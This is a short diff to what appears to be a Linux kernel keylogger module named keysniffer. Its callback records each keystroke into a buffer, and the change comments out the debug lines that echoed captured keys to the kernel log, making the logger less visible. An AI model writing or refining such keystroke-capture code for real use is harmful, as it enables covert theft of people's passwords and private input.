@@ -123,7 +123,7 @@ int keysniffer_cb(struct notifier_block *nblock,
 				buf_pos += len;
 				keys_buf[buf_pos++] = '\n';
 
-				pr_debug("%s\n", us_keymap[param->value][1]);
+				/* pr_debug("%s\n", us_keymap[param->value][1]); */
 			}
 			else if (us_keymap[param->value][0]) {
 				len = strlen(us_keymap[param->value][0]);
@@ -137,7 +137,7 @@ int keysniffer_cb(struct notifier_block *nblock,
 				buf_pos += len;
 				keys_buf[buf_pos++] = '\n';
 
-				pr_debug("%s\n", us_keymap[param->value][0]);
+				/* pr_debug("%s\n", us_keymap[param->value][0]); */
 			}
 		}
 	}
